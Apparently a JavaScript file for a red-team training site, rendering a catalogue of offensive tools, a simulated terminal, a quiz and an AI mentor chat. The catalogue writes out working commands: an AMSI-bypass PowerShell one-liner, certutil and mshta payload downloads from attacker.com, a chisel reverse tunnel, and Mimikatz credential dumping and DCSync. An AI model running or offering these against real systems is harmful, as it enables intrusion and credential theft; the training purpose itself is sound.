// ==========================================
// PWNBOX MODULE 08: BLACK OPS & C2 EVASION
// API Key loaded from js/config.js
// ==========================================
const apiKey = (typeof window !== "undefined" && window.GROQ_API_KEY) || 
                 (typeof GROQ_API_KEY !== "undefined" ? GROQ_API_KEY : "") || 
                 localStorage.getItem('pwnbox_groq_api_key') || 
                 "";

const MODULE_KEY       = 'module_blackops_completed';
const CUSTOM_TOOLS_KEY = 'blackops_custom_tools';
const EDITED_TOOLS_KEY = 'blackops_edited_default_tools';
const DELETED_TOOLS_KEY= 'blackops_deleted_default_indices';
const CUSTOM_CATS_KEY  = 'blackops_custom_categories';

const defaultTools = [
    {
        name: "1. Cobalt Strike & Havoc C2",
        link: "https://github.com/HavocFramework/Havoc",
        category: "CommandControl",
        brief: "Advanced adversary simulation and post-exploitation Command & Control (C2) frameworks. Enables red teams to deploy lightweight in-memory agent beacons, establish stealthy HTTPS/DNS listeners, customize malleable C2 network signatures to mimic legitimate traffic (like Amazon or Microsoft CDNs), and execute post-exploitation modules with Sleep Mask encryption.",
        use: "Havoc Client setup: <code>./havoc client</code><br>Deploy Demon Beacon: <code>demon -l https://c2.internal -s 45s -j 20%</code><br>Spawn stealth process: <code>inline-execute sleepmask.o</code>",
        useful: "Modern EDRs detect standard reverse shells immediately. C2 frameworks use encrypted beacon jitter, asynchronous check-ins, and in-memory execution to maintain persistent access across enterprise networks without tripping behavioral alarms."
    },
    {
        name: "2. AMSI & EDR Memory Bypasser",
        link: "https://amsi.fail",
        category: "DefenseEvasion",
        brief: "In-memory patcher targeting Microsoft's Antimalware Scan Interface (AMSI) and Event Tracing for Windows (ETW). By overwriting the starting bytes of 'AmsiScanBuffer' in amsi.dll with an x86 return instruction (0xC3 / RET), any subsequent malicious PowerShell script or C# binary passes through the scanner without inspection.",
        use: "One-liner PowerShell in-memory patch:<br><code>$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)</code><br>Direct memory patching: <code>[MemoryPatch]::PatchAmsi()</code>",
        useful: "Allows security testers to execute Mimikatz or SharpHound directly inside PowerShell memory without Windows Defender detecting or killing the process."
    },
    {
        name: "3. LOLBins (Living Off the Land)",
        link: "https://lolbas-project.github.io",
        category: "DefenseEvasion",
        brief: "Living Off the Land Binaries and Scripts (LOLBAS). Attack techniques that abuse trusted, digitally signed Microsoft operating system executables (like certutil, bitsadmin, mshta, and rundll32) to download malicious payloads, execute shellcode, or bypass application whitelisting without installing external hacker tools.",
        use: "Download payload silently:<br><code>certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe</code><br>Execute remote HTA payload:<br><code>mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -enc ...\"\",0\"))</code>",
        useful: "EDR tools cannot simply block certutil or bitsadmin because genuine Windows updates and system services require them. LOLBins let attackers blend into normal system administration activity."
    },
    {
        name: "4. BloodHound & SharpHound",
        link: "https://github.com/BloodHoundAD/BloodHound",
        category: "ActiveDirectory",
        brief: "A graph theory tool that uncovers hidden, unintended relationships and privilege escalation paths within an Active Directory (AD) domain. It collects ACL permissions, group memberships, session data, and Kerberos delegation rules, mapping the fastest visual path from a compromised low-priv user to full Domain Admin.",
        use: "Run ingestor on target:<br><code>.\\SharpHound.exe -c All --outputdirectory C:\\temp</code><br>Import generated .zip into BloodHound GUI and query: <code>Shortest Paths to Domain Admins</code>",
        useful: "In enterprise domains with thousands of users, manual AD privilege escalation takes days. BloodHound computes shortest attack graphs in seconds, showing exact misconfigurations (like GenericAll or WriteDacl)."
    },
    {
        name: "5. Mimikatz & LSASS Dumpr",
        link: "https://github.com/gentilkiwi/mimikatz",
        category: "CredentialTheft",
        brief: "The industry standard credential extraction tool. It interacts directly with the Windows Local Security Authority Subsystem Service (LSASS) process memory to extract plaintext passwords, NTLM hashes, Kerberos tickets, and DPAPI keys from memory, and forge Golden/Silver Kerberos tickets.",
        use: "Privilege elevation: <code>privilege::debug</code><br>Extract logon credentials: <code>sekurlsa::logonpasswords</code><br>Execute DCSync domain password replication: <code>lsadump::dcsync /domain:corp.local /user:Administrator</code>",
        useful: "Grants instantaneous lateral movement capability across an entire Active Directory forest without cracking hashes."
    },
    {
        name: "6. Chisel & Ligolo-ng",
        link: "https://github.com/nicocha30/ligolo-ng",
        category: "Pivoting",
        brief: "High-performance reverse tunneling and multi-network pivoting proxies. Creates an encrypted TCP/UDP tunnel over HTTP/WebSockets through corporate firewalls, transforming the compromised perimeter server into a pivot bridge to scan and exploit isolated internal subnets.",
        use: "Attacker listener: <code>./chisel server -p 8080 --reverse</code><br>Victim client tunnel: <code>chisel.exe client attacker.com:8080 R:1080:socks</code><br>Now route tools through tunnel: <code>proxychains nmap -sT 10.10.10.0/24</code>",
        useful: "Internal corporate networks (finance, databases) are completely unreachable from the public internet. Pivoting tools route entire toolkits through a single compromised gateway."
    }
];

// --- STORAGE & TOOL MANAGMENT ---
function getStoredCustomTools() {
    return JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
}

function getAllTools() {
    const custom = getStoredCustomTools();
    return [...defaultTools, ...custom];
}

function renderToolList() {
    const list = document.getElementById('toolList');
    if (!list) return;
    list.innerHTML = '';
    const tools = getAllTools();

    tools.forEach((t, i) => {
        const item = document.createElement('div');
        item.className = 'tool-item';
        item.innerHTML = `
            <div style="font-weight: 700; color: var(--text-main); font-size: 0.88rem;">${t.name}</div>
            <div style="font-family: 'Space Mono', monospace; font-size: 0.68rem; color: #9333ea; margin-top: 2px;">[${t.category}]</div>
        `;
        item.addEventListener('click', () => {
            document.querySelectorAll('.tool-item').forEach(el => el.classList.remove('active'));
            item.classList.add('active');
            renderToolDetails(t);
        });
        list.appendChild(item);
    });
}

function renderToolDetails(tool) {
    const panel = document.getElementById('detailsPanel');
    if (!panel) return;
    panel.innerHTML = `
        <div style="margin-bottom: 20px;">
            <div style="font-family: 'Space Mono', monospace; font-size: 0.72rem; color: #9333ea; font-weight: 800; margin-bottom: 4px;">CATEGORY: ${tool.category}</div>
            <h2 style="font-size: 1.5rem; font-weight: 900; margin-bottom: 8px;">${tool.name}</h2>
            <a href="${tool.link}" target="_blank" style="font-family: 'Space Mono', monospace; font-size: 0.75rem; color: #005A9C; text-decoration: underline;">🔗 Official Repository / Technical Reference ↗</a>
        </div>
        
        <div style="background: var(--bg-panel); border: 2px solid var(--border-dim); padding: 16px; margin-bottom: 16px; box-shadow: 3px 3px 0 var(--border-dim);">
            <h4 style="font-family: 'Space Mono', monospace; font-size: 0.82rem; margin-bottom: 6px; color: var(--text-main);">// ARCHITECTURAL OVERVIEW</h4>
            <p style="font-size: 0.88rem; line-height: 1.6; color: var(--text-muted);">${tool.brief}</p>
        </div>

        <div style="background: #010409; border: 2px solid var(--border-dim); padding: 16px; margin-bottom: 16px; color: #c084fc; font-family: 'Space Mono', monospace; box-shadow: 3px 3px 0 var(--border-dim);">
            <div style="font-size: 0.75rem; color: #9333ea; font-weight: 800; margin-bottom: 8px;"># TACTICAL COMMAND INVOCATION</div>
            <div style="font-size: 0.8rem; line-height: 1.6; word-break: break-all;">${tool.use}</div>
        </div>

        <div style="background: var(--bg-panel); border: 2px solid var(--border-dim); padding: 16px; box-shadow: 3px 3px 0 var(--border-dim);">
            <h4 style="font-family: 'Space Mono', monospace; font-size: 0.82rem; margin-bottom: 6px; color: #10b981;">// RED TEAM UTILITY</h4>
            <p style="font-size: 0.88rem; line-height: 1.6; color: var(--text-muted);">${tool.useful}</p>
        </div>
    `;
}

// --- PANEL TAB SWITCHING ---
function switchPanelTab(tabName) {
    document.querySelectorAll('.panel-tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => {
        c.classList.remove('active');
        c.style.display = 'none';
    });

    if (tabName === 'chat') {
        const btn = document.querySelector(".panel-tab[onclick*='chat']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('chatTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'terminal') {
        const btn = document.querySelector(".panel-tab[onclick*='terminal']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('terminalTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'quiz') {
        const btn = document.querySelector(".panel-tab[onclick*='quiz']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('quizTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    }
}

// --- TERMINAL COMMAND SANDBOX ---
function handleTerminalEnter(e) {
    if (e.key === 'Enter') {
        const input = document.getElementById('terminalInput');
        const cmd = input.value.trim().toLowerCase();
        input.value = '';
        executeTerminalCommand(cmd);
    }
}

function executeTerminalCommand(cmd) {
    const output = document.getElementById('terminalOutput');
    if (!output) return;

    const row = document.createElement('div');
    row.style.marginBottom = '6px';
    row.innerHTML = `<span style="color: #c084fc;">operator@blackops:~#</span> <span style="color: #ffffff;">${cmd}</span>`;
    output.appendChild(row);

    const res = document.createElement('div');
    res.style.marginBottom = '12px';

    if (cmd === 'help') {
        res.innerHTML = `
            <div style="color: #9333ea;">AVAILABLE BLACK OPS COMMANDS:</div>
            <div>- <b>beacon</b>: Spawn an in-memory HTTPS C2 beacon</div>
            <div>- <b>amsi-patch</b>: Apply AmsiScanBuffer memory bypass</div>
            <div>- <b>lolbins</b>: Simulate certutil.exe Living-Off-The-Land download</div>
            <div>- <b>dump-lsass</b>: Simulate in-memory LSASS credential extraction</div>
            <div>- <b>clear</b>: Clear terminal display</div>
        `;
    } else if (cmd === 'beacon') {
        res.innerHTML = `<span style="color: #10b981;">[+] Generating Havoc Demon shellcode...<br/>[+] Injecting into notepad.exe (PID 4820)...<br/>[+] Beacon established to https://c2.internal (Sleep: 30s, Jitter: 15%)<br/>[+] C2 SESSION 1 ACTIVE</span>`;
    } else if (cmd === 'amsi-patch') {
        res.innerHTML = `<span style="color: #eab308;">[*] Locating amsi.dll base address in process memory...<br/>[*] Offset AmsiScanBuffer found at 0x7FFA1920B2<br/>[+] Overwriting opcode bytes with 0xC3 (RET)...<br/>[✓] AMSI BYPASS SUCCESSFUL: In-memory scripts will not be scanned.</span>`;
    } else if (cmd === 'lolbins') {
        res.innerHTML = `<span style="color: #38bdf8;">[*] Invoking certutil.exe -urlcache -split -f http://10.10.14.5/stage.bin<br/>[+] Download complete. Process executed under trusted Microsoft digital certificate.</span>`;
    } else if (cmd === 'dump-lsass') {
        res.innerHTML = `<span style="color: #ef4444;">[!] Accessing LSASS memory handle via SeDebugPrivilege...<br/>[+] Dumping NTLM hashes:<br/>&nbsp;&nbsp;&nbsp;&nbsp;Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>&nbsp;&nbsp;&nbsp;&nbsp;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::</span>`;
    } else if (cmd === 'clear') {
        output.innerHTML = '';
        return;
    } else {
        res.innerHTML = `<span style="color: #ef4444;">Command not recognized. Type 'help' for stealth commands.</span>`;
    }

    output.appendChild(res);
    output.scrollTop = output.scrollHeight;
}

// --- QUIZ VERIFICATION ---
function checkQuizAnswer(qNum, correctVal) {
    const selected = document.querySelector(`input[name="q${qNum}"]:checked`);
    if (!selected) return;

    if (selected.value === correctVal) {
        if (window.showCustomAlert) {
            window.showCustomAlert("✓ CORRECT!", "Outstanding! You correctly identified the Black Ops evasion mechanism.", "success");
        } else {
            alert("✓ CORRECT! That is the proper evasion mechanism.");
        }
    } else {
        if (window.showCustomAlert) {
            window.showCustomAlert("✕ INCORRECT", "Review the C2 architecture and evasion notes and try again.", "error");
        } else {
            alert("✕ INCORRECT. Review the C2 evasion notes.");
        }
    }
}

// --- AI MENTOR (GROQ INTEGRATION) ---
async function sendMessage() {
    const input = document.getElementById('chatInput');
    const msg = input.value.trim();
    if (!msg) return;

    const history = document.getElementById('chatHistory');
    const userDiv = document.createElement('div');
    userDiv.className = 'msg user';
    userDiv.textContent = msg;
    history.appendChild(userDiv);
    input.value = '';

    const botDiv = document.createElement('div');
    botDiv.className = 'msg bot';
    botDiv.textContent = 'Decrypting intelligence response...';
    history.appendChild(botDiv);
    history.scrollTop = history.scrollHeight;

    try {
        const sysPrompt = "You are the PwnBox Module 08 Classified Black Ops AI Mentor. You specialize in advanced adversary simulation, C2 frameworks (Cobalt Strike, Havoc), in-memory AMSI/ETW evasion, Living-off-the-Land (LOLBins), Active Directory Kerberos attack chains, and internal pivoting. Answer concisely, technically, and strictly for ethical educational red teaming.";
        
        const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${apiKey}`,
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                model: "openai/gpt-oss-20b",
                messages: [
                    { role: "system", content: sysPrompt },
                    { role: "user", content: msg }
                ],
                temperature: 0.6,
                max_tokens: 600
            })
        });

        const data = await response.json();
        if (data.choices && data.choices[0]) {
            botDiv.innerHTML = data.choices[0].message.content.replace(/\n/g, '<br/>');
        } else {
            botDiv.textContent = "Error: Classified downlink connection interrupted.";
        }
    } catch (e) {
        botDiv.textContent = "Downlink failed. Ensure Groq API key is valid in js/config.js.";
    }
    history.scrollTop = history.scrollHeight;
}

function handleEnter(e) {
    if (e.key === 'Enter') sendMessage();
}

// Module completion
function toggleModuleCompletion() {
    const isCompleted = localStorage.getItem(MODULE_KEY) === 'true';
    if (isCompleted) {
        localStorage.removeItem(MODULE_KEY);
        document.getElementById('completeModuleBtn').textContent = 'Mark Module Completed';
        document.getElementById('completeModuleBtn').style.background = '';
    } else {
        localStorage.setItem(MODULE_KEY, 'true');
        document.getElementById('completeModuleBtn').textContent = '✓ Module Completed!';
        document.getElementById('completeModuleBtn').style.background = '#10b981';
        if (window.showCustomAlert) {
            window.showCustomAlert("MODULE COMPLETED!", "Classified Black Ops certification recorded in local dossier.", "success");
        }
    }
}

// Custom Tool Modal
function openAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        setTimeout(() => modal.classList.add('active'), 10);
    }
}
function closeAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => { modal.style.display = 'none'; }, 200);
    }
}
function saveCustomTool() {
    const name = document.getElementById('customToolName').value.trim();
    const cat = document.getElementById('customToolCategory').value.trim();
    const desc = document.getElementById('customToolDesc').value.trim();
    const syn = document.getElementById('customToolSyntax').value.trim();

    if (!name || !cat) return;

    const list = getStoredCustomTools();
    list.push({
        name: name,
        category: cat,
        brief: desc || "Custom user tool.",
        use: syn || "No command provided.",
        useful: "Custom red team addition.",
        link: "#"
    });
    localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(list));
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    closeAddToolModal();
    renderToolList();
    if (window.showCustomAlert) {
        window.showCustomAlert("STEALTH TOOL ADDED", `${name} added to your private Black Ops arsenal!`, "success");
    }
}

// Init
document.addEventListener('DOMContentLoaded', () => {
    renderToolList();
    if (defaultTools[0]) renderToolDetails(defaultTools[0]);
    if (localStorage.getItem(MODULE_KEY) === 'true') {
        const btn = document.getElementById('completeModuleBtn');
        if (btn) {
            btn.textContent = '✓ Module Completed!';
            btn.style.background = '#10b981';
        }
    }
});
